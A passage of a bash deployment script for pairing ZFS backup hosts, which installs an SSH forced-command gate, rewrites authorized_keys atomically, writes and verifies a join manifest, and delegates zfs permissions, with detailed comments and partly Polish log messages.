                  "cd $REPO_DIR && ./deploy.sh --join=/root/$(basename "$pkg")"; then
            remote_ok=1
            log "remote --join on $PEER_HOST succeeded."
            if [ -n "$PEER_MODE" ]; then
                if have_terminal; then
                    log "opening the scope editor on $PEER_HOST over ssh -t (drafts it first only if it does not exist yet, same as 'crontab -e')..."
                else
                    log "no terminal here, so the scope will be DRAFTED on $PEER_HOST but not opened -- the commands to review it come below (P6)"
                fi
                remote_scope_stage "$my_label" "$PEER_HOST" "$PEER_PORT" "$remote_scope"
                scope_rc=$?
                [ "$scope_rc" -ne 0 ] && warn "the remote scope stage on $PEER_HOST did not finish cleanly (see above) -- see the exact recovery step below"
            fi
        else
            # 124 is timeout(1)'s "I killed it". Name that case separately: a
            # peer that stalled is a different problem from a peer that
            # refused, and collapsing them sends the operator looking for an
            # ssh error message that was never printed.
            if [ "$?" -eq 124 ]; then
                warn "--join-remotely gave up after ${PEER_REMOTE_JOIN_TIMEOUT}s -- the peer accepted the connection but the remote step did not finish. Nothing here is half-done: --join commits nothing before scope acceptance. Falling back to the manual steps below."
            else
                warn "--join-remotely could not complete automatically (see any ssh/scp error above) -- falling back to the manual steps below."
            fi
        fi
    fi

    echo
    log "===================================================================="
    if [ "$remote_ok" -eq 1 ]; then
        log "Wsad dostarczony i --join wykonany zdalnie na $PEER_HOST (--join-remotely)."
        if [ -n "$PEER_MODE" ]; then
            case "$scope_rc" in
                0)
                    log "Zakres zredagowany zdalnie i zweryfikowany (--commit-scope-check OK, ssh -t)."
                    log "Zostalo: uruchom TAM, lokalnie na $PEER_HOST:"
                    log "  ssh root@$PEER_HOST"
                    log "  cd $REPO_DIR && ./deploy.sh --commit-scope=$my_label"
                    ;;
                2)
                    log "Draft NIE powiodl sie (patrz blad wyzej) -- zaden plik zakresu nie powstal."
                    log "Join juz wykonany, NIE powtarzaj go. Recznie na $PEER_HOST:"
                    log "  ssh root@$PEER_HOST"
                    log "  cd $REPO_DIR"
                    log "  ./deploy.sh --draft-scope=$my_label"
                    log "  \${EDITOR:-vi} $remote_scope"
                    log "  ./deploy.sh --commit-scope-check=$my_label"
                    ;;
                3)
                    log "Sesja edytora na $PEER_HOST zakonczyla sie niezerowo -- zakres NIE jest gotowy."
                    log "Plik mogl juz powstac (jesli draft sie udal): $remote_scope"
                    log "Recznie na $PEER_HOST:"
                    log "  ssh root@$PEER_HOST"
                    log "  cd $REPO_DIR"
                    log "  \${EDITOR:-vi} $remote_scope"
                    log "  ./deploy.sh --commit-scope-check=$my_label"
                    ;;
                4)
                    log "Zakres zredagowany, ale NIE przeszedl --commit-scope-check (patrz blad wyzej)."
                    log "Popraw recznie na $PEER_HOST:"
                    log "  ssh root@$PEER_HOST"
                    log "  cd $REPO_DIR"
                    log "  \${EDITOR:-vi} $remote_scope"
                    log "  ./deploy.sh --commit-scope-check=$my_label"
                    ;;
                5)
                    # P6. Not a failure -- a refusal to fake consent. The draft
                    # exists and is the whole point; what is missing is a human,
                    # and no exit code can supply one.
                    log "Zakres ZOSTAL NASZKICOWANY na $PEER_HOST, ale NIE zredagowany -- ten przebieg nie ma terminala."
                    log "Zakres to dokument zgody. Edytor otwarty przy nikim nie tworzy zgody, wiec go nie otwieramy."
                    log "Nic nie zostalo przyznane. Dokoncz TAM, na $PEER_HOST:"
                    log "  ssh root@$PEER_HOST"
                    log "  cd $REPO_DIR"
                    log "  \${EDITOR:-vi} $remote_scope   # zawez do tego, co naprawde oddajesz"
                    log "  ./deploy.sh --commit-scope=$my_label"
                    ;;
                *)
                    log "Zostalo: uruchom TAM, lokalnie na $PEER_HOST:"
                    log "  ssh root@$PEER_HOST"
                    log "  cd $REPO_DIR"
                    log "  ./deploy.sh --draft-scope=$my_label   # jesli jeszcze nie istnieje"
                    log "  \${EDITOR:-vi} $remote_scope"
                    log "  ./deploy.sh --commit-scope-check=$my_label"
                    ;;
            esac
            log "(finalizacja/grant NIGDY nie jedzie zdalnie -- U10, warunek 1)"
        fi
    else
        log "Wsad gotowy: $pkg"
        log "Przenies go recznie na $PEER_HOST i uruchom tam z konsoli:"
        log "  scp $pkg root@$PEER_HOST:/root/"
        log "  ssh root@$PEER_HOST"
        log "  cd $REPO_DIR && ./deploy.sh --join=/root/$(basename "$pkg")"
    fi
    if [ "$PEER_ROTATE" -eq 1 ]; then
        log "Po --join tam: zweryfikuj dry-runem z NOWYM kluczem ($active_keyfile -n),"
        log "dopiero potem tutaj: --pair --peer=$PEER_HOST --revoke-old"
    fi
    log "===================================================================="
}

# ------------------------------------------------------------------------------
# The peer-side gate (ADR-0012 DISABLED). Installed here, at --join, because
# this is the one moment the relationship's account and key are both being
# created: a gate installed later would leave a window in which the key runs
# ungated, and a gate installed by hand would be one more thing to forget.
#
# Deployed OUTSIDE the repo checkout, same reasoning as update-control.sh: a
# rollback of the managed checkout must not be able to remove the thing that
# enforces a disable. If the gate file ever goes missing, sshd runs a command
# that does not exist and the relationship fails loudly -- fail-closed, which
# is the correct direction for this particular file.
PAIR_GATE_PATH="${PAIR_GATE_PATH:-/usr/local/sbin/zfs-pair-gate}"
# PAIR_GATE_STATE_DIR is declared far above, next to ALERT_SHARED_DIR: Phase 4's
# group sweep has to know which subtree to leave alone, and it runs long before
# this section. Kept as one definition rather than two literals -- the whole
# point is that the sweep and the gate agree on the same path.

# pair_label_valid <label>
#
# The ONE grammar for a relationship label on the installing side, applied
# before any path is built or any forced-command line is rendered. Rejects
# the empty string, the path components '.' and '..' (REV-20260806-051 F1 --
# they pass a character-class check and then resolve to real directories),
# and anything outside the project's usual name charset, which also excludes
# '/'. Deliberately mirrored, not shared, with the copy inside
# zfs-pair-gate.sh: that file is deployed standalone and must not depend on
# sourcing this one.
pair_label_valid() {
    case "${1-}" in
        ""|.|..) return 1 ;;
        *[!A-Za-z0-9._-]*) return 1 ;;
        *) return 0 ;;
    esac
}

# gate_state_dir_ok "<mode> <group>" <account>
#
# Does the relationship's state directory actually let its account remove the
# marker? Two conditions, and the GROUP DIGIT is the whole point of the second
# one: `stat -c %a` renders 0755 as "755", and a pattern looking for a 7
# anywhere in that string matches the OWNER's digit while the group cannot
# write at all (REV-20260806-050 F1 -- exactly the degraded state this check
# was added to catch, accepted for the wrong reason). Modes may be three or
# four digits (2775), so the group digit is the second from the right, never
# a fixed offset from the left.
#
# Split out as its own function purely so it can be tested by value instead of
# by stubbing a filesystem.
gate_state_dir_ok() {
    local st="$1" account="$2" mode grp
    [ -n "$st" ] || return 1                 # stat failed
    case "$st" in *" "*) ;; *) return 1 ;; esac
    mode="${st%% *}"; grp="${st##* }"
    [ "$grp" = "$account" ] || return 1
    case "$mode" in ""|*[!0-7]*) return 1 ;; esac
    [ "${#mode}" -ge 2 ] || return 1
    case "${mode:$(( ${#mode} - 2 )):1}" in
        2|3|6|7) return 0 ;;
    esac
    return 1
}

# install_pair_gate <label> <account>
install_pair_gate() {
    local label="$1" account="$2"
    pair_label_valid "$label" || {
        warn "refusing to install a gate for '$label': not a valid relationship label"
        return 1
    }
    # $_DEPLOY_DIR, not $REPO_DIR: the gate must come from the checkout this
    # very script was invoked from (BASH_SOURCE, never $0 -- see the crontab
    # incident this project already had), not from wherever REPO_DIR happens
    # to point on a host where the two differ.
    local src="$_DEPLOY_DIR/zfs-pair-gate.sh"
    [ -r "$src" ] || { warn "$src is missing from this checkout"; return 1; }

    if [ -L "$PAIR_GATE_PATH" ]; then
        warn "$PAIR_GATE_PATH is a symlink -- refusing to install through it"
        return 1
    fi
    install -m 0755 -o root -g root "$src" "$PAIR_GATE_PATH" \
        || { warn "could not install $src to $PAIR_GATE_PATH"; return 1; }
    # Read back by RUNNING it, not by stat'ing it: an installed file that
    # cannot execute (noexec mount, wrong interpreter) would otherwise be
    # discovered by the first backup instead of by this install.
    "$PAIR_GATE_PATH" -V >/dev/null 2>&1 \
        || { warn "$PAIR_GATE_PATH was written but does not run"; return 1; }

    # The relationship's own state directory. Group-owned by the account and
    # group-writable, because the owner's model (2026-08-06) lets the
    # relationship's key run `enable` -- the removal of the marker is an
    # unlink IN this directory. The PARENT stays root-owned and not group
    # writable, so no relationship can reach another's state.
    mkdir -p "$PAIR_GATE_STATE_DIR" || { warn "could not create $PAIR_GATE_STATE_DIR"; return 1; }
    chmod 0755 "$PAIR_GATE_STATE_DIR" 2>/dev/null || :
    mkdir -p "$PAIR_GATE_STATE_DIR/$label" || { warn "could not create $PAIR_GATE_STATE_DIR/$label"; return 1; }
    if [ "$account" != root ]; then
        chown "root:$account" "$PAIR_GATE_STATE_DIR/$label" 2>/dev/null || :
        chmod 0775 "$PAIR_GATE_STATE_DIR/$label" 2>/dev/null || :
        # VERIFY, do not assume. Seen live on metropolis pve2 (2026-08-06) and
        # again on pve9 (2026-08-20): the chown did not take, the directory
        # kept the group it inherited from the parent's setgid bit, and
        # because this only warned the relationship came out of enrolment
        # looking complete. The operator discovers it at the worst possible
        # moment -- while trying to engage a block.
        #
        # WHICH verb breaks was stated backwards here until 2026-08-20, and
        # the error mattered because the warn-but-continue decision rested on
        # it. Measured, not reasoned: `disable-client` is what fails. Both
        # verbs write to this DIRECTORY -- disable creates the marker, enable
        # unlinks it -- so a directory the account cannot write costs the
        # whole gate, not just the lift. The live failure reads:
        #     zfs-pair-gate: .../relationships/<label>/disabled.new:
        #     Permission denied
        # Kept non-fatal to the join, now for a reason that survives the
        # correction: the account and key exist by this point, the join is
        # otherwise sound, and root on the peer can repair it in two commands
        # without redoing enrolment. What is lost until then is the hard pause
        # in BOTH directions, so that is what the message has to say.
        local st; st=$(stat -c '%a %G' "$PAIR_GATE_STATE_DIR/$label" 2>/dev/null) || st=""
        if ! gate_state_dir_ok "$st" "$account"; then
            warn "$PAIR_GATE_STATE_DIR/$label is not group-writable by '$account' (now: $(stat -c '%a %U:%G' "$PAIR_GATE_STATE_DIR/$label" 2>/dev/null))"
            warn "  consequence: the hard pause is UNUSABLE for this relationship -- 'disable-client' cannot write the marker and 'enable-client' cannot remove it. The gate still refuses whatever is ALREADY marked disabled; what you cannot do is engage or lift a block without root here."
            warn "  fix here, then re-run --join (it is a safe no-op reconfirmation):"
            warn "    chown root:$account $PAIR_GATE_STATE_DIR/$label && chmod 0775 $PAIR_GATE_STATE_DIR/$label"
        fi
    else
        chmod 0755 "$PAIR_GATE_STATE_DIR/$label" 2>/dev/null || :
    fi
    log "pair gate installed at $PAIR_GATE_PATH; relationship state at $PAIR_GATE_STATE_DIR/$label"
    return 0
}

# write_gated_key_line <authorized_keys> <pubkey line> <label>
#
# Replaces THIS relationship's line and nothing else. Not append-only any
# more: the line now carries a forced command, so a stale bare copy of the
# same key sitting above it would authenticate ungated and silently defeat
# every disable. Every OTHER line in the file is preserved byte for byte --
# other relationships, other tools, and the operator's own keys.
#
# Written to a temp file in the same directory and renamed, so a crash cannot
# leave a truncated authorized_keys (which locks the account out entirely),
# and read back before the rename is trusted.
write_gated_key_line() {
    local ak="$1" pub="$2" label="$3"
    # Before anything is written: a forced-command line carrying '.' or '..'
    # would be a gate that cannot identify itself (REV-20260806-051 F1).
    pair_label_valid "$label" || {
        warn "refusing to render a key line for '$label': not a valid relationship label"
        return 1
    }
    # The key material only: type + base64, without any comment. That is what
    # identifies "the same key" across a re-join whose comment changed.
    # Validated as a KEY, not merely as "two words": the first field must be a
    # real key type, which also means an authorized_keys options prefix
    # (command="...", environment="...") can never arrive here and be pasted
    # in as if it were key material -- defence in depth beside the check the
    # package parser already does on pubkey.pub.
    local ktype kdata
    ktype=$(printf '%s' "$pub" | awk '{print $1}')
    kdata=$(printf '%s' "$pub" | awk '{print $2}')
    case "$ktype" in
        ssh-*|ecdsa-*|sk-ssh-*|sk-ecdsa-*) ;;
        *) warn "not a public key: '$ktype' is not a key type"; return 1 ;;
    esac
    [ -n "$kdata" ] || { warn "not a public key: no key material after the type"; return 1; }
    local keymat="$ktype $kdata"

    local want="command=\"$PAIR_GATE_PATH $label\",restrict $pub"
    local tmp="$ak.new.$$"

    # Everything that is not this key, verbatim. `grep -vF` on the key
    # material catches both the bare form and any previously gated form.
    if [ -s "$ak" ]; then
        grep -vF "$keymat" "$ak" > "$tmp" 2>/dev/null || : # no match => empty file, fine
    else
        : > "$tmp"
    fi
    printf '%s\n' "$want" >> "$tmp" || { rm -f "$tmp"; warn "could not write $tmp"; return 1; }
    chmod 600 "$tmp" 2>/dev/null || :

    # Carry the ORIGINAL file's ownership onto the replacement. An atomic
    # replace done as root otherwise silently hands the account's
    # authorized_keys to root:root, and sshd with StrictModes=yes (the
    # default) then refuses EVERY key in it -- the account is locked out of
    # its own host, including by keys that have nothing to do with this
    # relationship.
    #
    # Found live on metropolis pve2, 2026-08-06, by the residue/lockout check
    # for this step: after a clean, correct rewrite, both the relationship key
    # AND the operator's own key stopped working, and auth.log said only
    # "Connection closed [preauth]". do_join happens to repair this a few
    # lines later with its own `chown -R`, so the join path was never broken
    # -- but any other caller (starting with the migration of relationships
    # enrolled before the gate existed) would have locked the account out.
    # A function that replaces a file atomically owns the job of preserving
    # its metadata; relying on an unrelated later chown is how this stays
    # broken for the next caller.
    # REV-20260806-049 F1: this is FAIL-CLOSED, not best-effort. Warning and
    # committing anyway would leave exactly the lockout that motivated the
    # ownership work in the first place -- a root:root authorized_keys that
    # sshd refuses wholesale, taking unrelated operator keys down with it.
    # An atomic writer owns the metadata invariant: if safe ownership cannot
    # be established, the live file is not replaced at all. A relationship
    # that is not gated yet is a known, recoverable state; an account locked
    # out of its own host is not.
    local owner=""
    if [ -e "$ak" ]; then
        owner=$(stat -c '%U:%G' "$ak" 2>/dev/null) || owner=""
    else
        owner=$(stat -c '%U:%G' "$(dirname "$ak")" 2>/dev/null) || owner=""
    fi
    case "$owner" in
        ""|:*|*:) rm -f "$tmp"
                  warn "could not determine who owns $ak (got '$owner') -- refusing to replace it, because a replacement of unknown ownership can lock this account out of its own host. $ak is unchanged."
                  return 1 ;;
    esac
    # Only chown when it is actually needed. Two real cases where the
    # replacement already has the right ownership and a chown would be
    # pointless -- and, worse, could FAIL and block a correct write: this
    # function running as the account itself rather than as root, and any
    # environment whose chown cannot name the same owner back (the dev box
    # this suite also runs on). Compare first, act only on a difference.
    local tmp_owner; tmp_owner=$(stat -c '%U:%G' "$tmp" 2>/dev/null) || tmp_owner=""
    if [ "$tmp_owner" != "$owner" ]; then
        if ! chown "$owner" "$tmp" 2>/dev/null; then
            rm -f "$tmp"
            warn "could not set ownership '$owner' on the replacement -- refusing to commit it. $ak is unchanged; fix the ownership problem and re-run."
            return 1
        fi
    fi

    # Read back BEFORE trusting the rename: the gated line must be present
    # exactly once, and every line that was there before and is not this key
    # must still be there.
    if [ "$(grep -cxF "$want" "$tmp")" != "1" ]; then
        rm -f "$tmp"; warn "read-back failed: the gated key line is not in $tmp exactly once"; return 1
    fi
    local lost=0 line
    if [ -s "$ak" ]; then
        while IFS= read -r line; do
            case "$line" in *"$keymat"*) continue ;; esac
            grep -qxF "$line" "$tmp" || lost=1
        done < "$ak"
    fi
    if [ "$lost" -ne 0 ]; then
        rm -f "$tmp"; warn "read-back failed: another key line would have been lost -- $ak is unchanged"; return 1
    fi

    mv -f "$tmp" "$ak" || { rm -f "$tmp"; warn "could not commit $ak"; return 1; }
    log "installed the gated key line in $ak (forced command: $PAIR_GATE_PATH $label); every other line preserved"
    return 0
}

# verify_join_manifest <path> <role> <as> <mode> <target> <account> <fp> <remote>
# -- REV-20260804-038: reads back a join manifest at <path> and confirms every
# field do_join() rendered actually landed, byte for byte, as parsed values --
# not just "the write returned 0". Explicit parameters (not the caller's own
# locals via bash's dynamic scoping) so this is independently testable, same
# reasoning as remote_scope_stage's own extraction (REV-20260804-037 F1).
# Used twice by do_join(): once on the temp file, before it is trusted enough
# to become the durable record, and again on the final path, after the atomic
# rename -- two different failure classes (a bad render; a rename that landed
# something else) share nothing except that both must be caught before
# "Join zakonczony" is allowed to print.
verify_join_manifest() {
    local path="$1" want_role="$2" want_as="$3" want_mode="$4" want_target="$5" \
          want_account="$6" want_fp="$7" want_remote="$8" want_uid="${9:-}"
    [ -r "$path" ] || return 1
    local got_role got_as got_mode got_target got_account got_fp got_remote got_uid
    { read -r got_role; read -r got_as; read -r got_mode; read -r got_target; \
      read -r got_account; read -r got_fp; read -r got_remote; read -r got_uid; } < <(
        (
            PEER_JOIN_ROLE="" PEER_JOIN_AS="" PEER_JOIN_MODE="" PEER_JOIN_TARGET="" \
            PEER_JOIN_ACCOUNT="" PEER_JOIN_FINGERPRINT="" PEER_JOIN_REMOTE="" \
            PEER_JOIN_ACCOUNT_UID=""
            # shellcheck disable=SC1090
            . "$path" 2>/dev/null
            printf '%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n' \
                "$PEER_JOIN_ROLE" "$PEER_JOIN_AS" "$PEER_JOIN_MODE" "$PEER_JOIN_TARGET" \
                "$PEER_JOIN_ACCOUNT" "$PEER_JOIN_FINGERPRINT" "$PEER_JOIN_REMOTE" \
                "$PEER_JOIN_ACCOUNT_UID"
        )
    )
    [ "$got_role" = "$want_role" ] && [ "$got_as" = "$want_as" ] \
        && [ "$got_mode" = "$want_mode" ] && [ "$got_target" = "$want_target" ] \
        && [ "$got_account" = "$want_account" ] && [ "$got_fp" = "$want_fp" ] \
        && [ "$got_remote" = "$want_remote" ] && [ "$got_uid" = "$want_uid" ]
}

# do_join -- runs on the second host, once, from its own console. Consumes the
# wsad produced by --pair: never touches any account/relationship other than
# the one this specific package describes.
do_join() {
    # The package was validated and unpacked by prepare_package BEFORE the
    # deployment phases ran -- see the preflight next to --join-check. Nothing
    # is re-read or re-parsed here: a second independent parse of the same path
    # is exactly the window prepare_package's private copy exists to close.
    [ -n "${JOIN_WORKDIR:-}" ] && [ -f "$JOIN_WORKDIR/pubkey.pub" ]         || die "internal: do_join reached without a validated package"
    local workdir="$JOIN_WORKDIR"

    # Local aliases, now that every value has been checked. Named as before so
    # the rest of this function reads unchanged.
    local PEER_CONF_ROLE="${PC[PEER_CONF_ROLE]}"
    local PEER_CONF_TARGET="${PC[PEER_CONF_TARGET]:-}"
    local PEER_CONF_ACCOUNT="${PC[PEER_CONF_ACCOUNT]}"
    local PEER_CONF_AS="${PC[PEER_CONF_AS]}"
    local PEER_CONF_DATASETS="${PC[PEER_CONF_DATASETS]:-}"
    local PEER_CONF_REQUESTED="${PC[PEER_CONF_REQUESTED]:-}"
    local PEER_CONF_MODE="${PC[PEER_CONF_MODE]:-}"
    local PEER_CONF_INITIATOR_LABEL="${PC[PEER_CONF_INITIATOR_LABEL]}"
    local PEER_CONF_REMOTE_JOIN="${PC[PEER_CONF_REMOTE_JOIN]:-}"

    # pc_is_label already refused anything this would have had to rewrite, so
    # the old sanitising tr is gone: a label that needed sanitising is now a
    # package to reject, not one to quietly repair.
    local label="$PEER_CONF_INITIATOR_LABEL"
    local mpath; mpath=$(peer_manifest_path "$label")
    local new_fp; new_fp=$(pubkey_fingerprint "$workdir/pubkey.pub")
    local new_pub; new_pub=$(cat "$workdir/pubkey.pub")
    log "package accepted: role=$PEER_CONF_ROLE as=$PEER_CONF_AS account=$PEER_CONF_ACCOUNT from '$label'"
    # ---- validation complete; persistent changes start here ----
    mkdir -p "$PEER_STATE_DIR"

    # ---- collision detection: manifest already exists under this label with
    # a DIFFERENT account/target -- that is two unrelated peers colliding on
    # the same label, not a rotation. Refuse rather than guess. A matching
    # account/target with a different key is treated as a legitimate rotation
    # driven by --rotate on the other side. ----
    local prior_granted_datasets=""
    if [ -r "$mpath" ]; then
        # shellcheck disable=SC1090
        . "$mpath"
        # A guided --join rerun may arrive after scope commit. Preserve the
        # relationship-owned grant inventory when republishing the manifest;
        # otherwise the byte-identical scope/hash would correctly skip a
        # redundant grant, but the next narrowing would forget what this
        # relationship is allowed to revoke.
        prior_granted_datasets="${PEER_JOIN_GRANTED_DATASETS:-}"
        if [ -n "${PEER_JOIN_FINGERPRINT:-}" ] && [ "$PEER_JOIN_FINGERPRINT" != "$new_fp" ]; then
            if [ "${PEER_JOIN_ACCOUNT:-}" != "$PEER_CONF_ACCOUNT" ] || [ "${PEER_JOIN_TARGET:-}" != "$PEER_CONF_TARGET" ]; then
                die "manifest for label '$label' already exists with a DIFFERENT account/target ($PEER_JOIN_ACCOUNT/$PEER_JOIN_TARGET vs $PEER_CONF_ACCOUNT/$PEER_CONF_TARGET) -- this looks like a label collision between two unrelated peers, not a rotation. Resolve by hand, do not re-run blindly."
            fi
            log "new key for an already-known peer '$label' (rotation) -- adding alongside the existing one"
        fi
    fi

    local account="$PEER_CONF_ACCOUNT"
    local home_dir="/root"
    local account_uid=""
    if [ "$PEER_CONF_AS" != "root" ]; then
        if id "$account" >/dev/null 2>&1; then
            log "account $account already exists, leaving it alone"
        else
            useradd -m -s /bin/bash -c "zfs-snapshot-all peer account for $label" "$account" || die "useradd failed"
            passwd -l "$account" >/dev/null || warn "could not lock password for $account"
            log "created isolated peer account $account"
        fi
        home_dir="/home/$account"
        # REV-20260804-040: the durable principal binding --leave needs to
        # revoke correctly after the account (and its NAME) may already be
        # gone. Captured once, here, at the one point this account is known
        # to exist under this exact name -- not re-derived later from
        # whatever `zfs allow` happens to display, which cannot distinguish
        # this relationship's orphan from another one's on the same dataset.
        account_uid=$(id -u "$account")
    fi

    local ssh_dir="$home_dir/.ssh"
    local ak="$ssh_dir/authorized_keys"
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"
    touch "$ak"
    install_pair_gate "$label" "$account" || die "could not install the pair gate for '$label' -- refusing to install a key line pointing at a gate that is not there"
    write_gated_key_line "$ak" "$new_pub" "$label" || die "could not write $ak -- it is unchanged; see the error above"
    chmod 600 "$ak"
    if [ "$PEER_CONF_AS" != "root" ]; then
        chown -R "$account:$account" "$ssh_dir"
    fi

    # ---- target dataset: created HERE only for push (this host is the
    # receiver in that role). For pull it was already created by --pair.
    # Per the naming convention (<target>/<host-zrodla>/<dataset>), the root
    # to create/allow is target/initiator-label -- the initiator IS the
    # "source host" from this side's point of view in push mode. ----
    local push_dest_root=""
    if [ "$PEER_CONF_ROLE" = "push" ]; then
        push_dest_root="$PEER_CONF_TARGET/${PEER_CONF_INITIATOR_LABEL:-$label}"
        if zfs list -H -o name -- "$push_dest_root" >/dev/null 2>&1; then
            log "target dataset $push_dest_root already exists"
        else
            zfs create -p -- "$push_dest_root" && log "created target dataset $push_dest_root" \
                || die "zfs create -p $push_dest_root failed"
        fi
    fi

    # ---- zfs allow. REV-20260802-033 slice 2 (U1/U2): for a PULL peer this
    # host is the SOURCE, and the choice of what to delegate now belongs to a
    # separate, deliberate act against a scope file the operator edits HERE --
    # see do_commit_scope. --join creates the account and installs the key and
    # stops there: zero zfs permissions, so a package alone (even a hostile
    # one) can never cause a grant. push is unchanged -- this host is the
    # TARGET in that role, delegating its own destination ROOT is not a
    # dataset-selection choice the scope file has any say over, so it still
    # happens right here. Skipped entirely for --as=root, which already has
    # full authority. ----
    if [ "$PEER_CONF_AS" != "root" ]; then
        if [ "$PEER_CONF_ROLE" = "pull" ]; then
            log "no zfs permissions granted yet -- run: ./deploy.sh --commit-scope=$label (after editing $(peer_scope_path "$label"); see lib-scope.sh's header)"
        else
            local perms="receive,create,mount,rollback,canmount"
            zfs allow -u "$account" "$perms" -- "$push_dest_root" || die "zfs allow failed for $push_dest_root"
            log "delegated ($perms) on $push_dest_root to $account (inherited by every dataset received under it)"
        fi
    fi

    # Quoted, and written from values the grammar checks already accepted. This
    # file is read back with `.` by later runs, so it is the second sink for
    # anything the package could smuggle -- belt and braces on purpose.
    # PEER_JOIN_DATASETS survives for now as the package's OWN record of what
    # it asked for (slice 5 makes it optional) -- it is no longer what
    # anything grants from. PEER_JOIN_AS lets do_commit_scope tell a root peer
    # apart from a delegated one without re-deriving it from the account name.
    # REV-20260802-033 slice 9 / U10 condition 3: "za pol roku 'skad sie tu
    # wzielo to konto' musi miec odpowiedz w pliku, nie w czyjejs pamieci".
    # PEER_JOIN_REMOTE_FROM duplicates $label deliberately -- $label is
    # already this manifest's own filename, but this field answers the
    # question without anyone needing to know that convention. The session
    # is captured HERE, on the peer, at the moment --join actually runs --
    # more trustworthy than a claim the collector could make about itself.
    local remote_fields=""
    if [ "$PEER_CONF_REMOTE_JOIN" = "yes" ]; then
        remote_fields=$(cat <<EOF2
PEER_JOIN_REMOTE="yes"
PEER_JOIN_REMOTE_FROM="$label"
PEER_JOIN_REMOTE_AT="$(date '+%Y-%m-%d %H:%M:%S')"
PEER_JOIN_REMOTE_SESSION="${SUDO_USER:-$(whoami)}@$(hostname -s 2>/dev/null || hostname)"
EOF2
)
    fi

    # REV-20260804-038: found live -- the direct `cat > "$mpath"` below used
    # to be unchecked and non-atomic, AFTER the account/key mutations above
    # had already happened. The live campaign hit exactly the failure this
    # allowed: a `set -u` abort mid-heredoc (the missing PEER_CONF_MODE local,
    # fixed in 0131c74) left a ZERO-BYTE manifest on disk while do_join()
    # still printed "Join zakonczony" and returned non-zero -- a real account
    # and trusted key with no durable relationship record, reported as
    # success by everything except the exit code. Fixed by treating the
    # manifest as this function's actual commit point: render to a temp file
    # in the same directory (atomic rename requires that), verify it reads
    # back correctly BEFORE it is trusted, rename, then verify the FINAL path
    # too (a rename landing something else is a different failure class than
    # a bad render, and costs nothing extra to also catch). Any failure past
    # this point returns non-zero, names the account/key that already exist,
    # and states plainly that re-running --join with the same package is safe
    # and repairs it -- never deletes an account or key that may predate this
    # attempt.
    local want_remote=""; [ "$PEER_CONF_REMOTE_JOIN" = "yes" ] && want_remote="yes"
    local partial_msg="PARTIAL ENROLMENT: account '$account' and its authorized key already exist (created above, before this failure) -- the manifest at $mpath was NOT published. Re-running './deploy.sh --join=<same package>' is safe and will repair it (the account/key steps above are already idempotent); do not delete the account or key by hand, they may predate this attempt."

    local mtmp
    mtmp=$(mktemp "${mpath}.XXXXXX" 2>/dev/null) || die "join: could not create a manifest temp file next to $mpath -- $partial_msg"
    if ! cat > "$mtmp" <<EOF
# peer pairing manifest (join side) -- managed by deploy.sh --join, do not edit by hand
PEER_JOIN_ROLE="$PEER_CONF_ROLE"
PEER_JOIN_AS="$PEER_CONF_AS"
PEER_JOIN_MODE="$PEER_CONF_MODE"
PEER_JOIN_DATASETS="$PEER_CONF_DATASETS"
PEER_JOIN_REQUESTED="$PEER_CONF_REQUESTED"
PEER_JOIN_TARGET="$PEER_CONF_TARGET"
PEER_JOIN_ACCOUNT="$account"
PEER_JOIN_ACCOUNT_UID="$account_uid"
PEER_JOIN_FINGERPRINT="$new_fp"
PEER_JOIN_GRANTED_DATASETS="$prior_granted_datasets"
$remote_fields
EOF
    then
        rm -f "$mtmp"
        die "join: could not write the manifest temp file -- $partial_msg"
    fi
    if ! chmod 0600 "$mtmp"; then
        rm -f "$mtmp"
        die "join: could not chmod the manifest temp file -- $partial_msg"
    fi
    if ! verify_join_manifest "$mtmp" "$PEER_CONF_ROLE" "$PEER_CONF_AS" "$PEER_CONF_MODE" \
            "$PEER_CONF_TARGET" "$account" "$new_fp" "$want_remote" "$account_uid"; then
        rm -f "$mtmp"
        die "join: the rendered manifest failed read-back verification (a field did not match what was intended) -- refused before publication. $partial_msg"
    fi
    if ! mv -f "$mtmp" "$mpath"; then
        rm -f "$mtmp"
        die "join: could not atomically install the manifest at $mpath -- $partial_msg"
    fi
    if ! verify_join_manifest "$mpath" "$PEER_CONF_ROLE" "$PEER_CONF_AS" "$PEER_CONF_MODE" \
            "$PEER_CONF_TARGET" "$account" "$new_fp" "$want_remote" "$account_uid"; then
        die "join: manifest at $mpath failed verification AFTER the atomic rename (should not happen) -- $partial_msg Report this if it recurs."
    fi

    echo
    log "===================================================================="
    log "Join zakonczony dla peera '$label' (konto: $account, rola: $PEER_CONF_ROLE)."
    [ "$PEER_CONF_REMOTE_JOIN" = "yes" ] && log "Wpis utworzony ZDALNIE z kolektora '$label' (--join-remotely) -- zapisane w manifescie."
    if [ "$PEER_CONF_AS" != "root" ] && [ "$PEER_CONF_ROLE" = "pull" ]; then
        [ -n "$PEER_CONF_MODE" ] \
            && log "Tryb '$PEER_CONF_MODE' -- wybor datasetow odbywa sie teraz na tym hoście."
        guided_join_scope "$label"
    fi
    log "Join i uprawnienia sa gotowe. Cron zostanie pokazany i zainstalowany przez 'zfs-backup.sh activate' na kolektorze."
    log "===================================================================="
}

# do_commit_scope -- the deliberate, separate act (U2) that grants a PULL
# peer's account exactly what the scope file at peer_scope_path selects.
# Runs do_commit_scope_check itself first for its manifest/role/as/parse
# preflight (the same function --commit-scope-check calls standalone, root-free,
# for the validate-only path), which leaves the result in
# COMMIT_SCOPE_MPATH/SFILE/ACCOUNT and SCOPE_ROOTS/etc for the rest of this to use.
#
# Permissions are granted per DATASET, never by granting the root and relying
# on zfs allow's inheritance to cover the rest: inheritance has no matching
# "deny", so an exclude_tree under an included root could not be honoured that
# way. Walking each root's actual descendants and testing scope_includes
# against them keeps exclusion simple at the cost of nothing new appearing
# until the next commit -- the same tradeoff every explicit dataset list in
# this project already makes.
# The same tag lib-zfs-snap.sh's hold_snapshot() uses (HOLD_TAG there),
# duplicated as a literal rather than sourcing lib-zfs-snap.sh -- deploy.sh
# deliberately does not (that library is the send/receive engine the
# transfer scripts source, not something the provisioning tool needs).
# Keep this in sync if that tag ever changes.
COMMIT_SCOPE_HOLD_TAG="zfssnapall_inflight"

# Does <dataset> have a snapshot held under the in-flight transfer tag? A
# resumable snapshot/send.py.load cycle holds its own snapshot for exactly as
# long as it needs to retry -- revoking the account's send/hold/release
# permission out from under that would strand the resume with no way to
# release its own hold or finish. Checked per dataset, not recursively: each
# entry in PEER_JOIN_GRANTED_DATASETS is one real dataset (do_commit_scope
# grants per descendant, never via inheritance), so that is also the unit a
# revoke acts on.
